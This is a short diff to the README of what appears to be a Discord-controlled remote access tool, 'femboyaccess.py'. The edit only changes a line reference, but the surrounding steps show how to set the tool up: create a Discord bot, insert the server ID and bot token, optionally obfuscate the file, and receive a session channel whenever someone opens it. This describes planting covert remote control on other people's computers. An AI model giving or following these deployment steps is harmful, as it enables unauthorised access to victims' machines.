@@ -75,7 +75,7 @@ exit - exit this session
   1. Download `femboyaccess.py` and Python with the necessary libraries if not already done.
   2. [Create a Discord bot](https://discord.dev/) (make sure to check all intents on) then invite it on a new server.
   3. Edit the `femboyaccess.py` file:
-      * Change the `guild_id` variable (one of the first defined variables in the code) to your server's ID
+      * Change the `guild_id` variable (line 44) to your server's ID
       * Change the last line of the code with your bot token
   4. Finished! Now, you can obfuscate it yourself if you want to. Whenever someone will open the file, a new channel will be created in your defined server with a custom session ID.
 
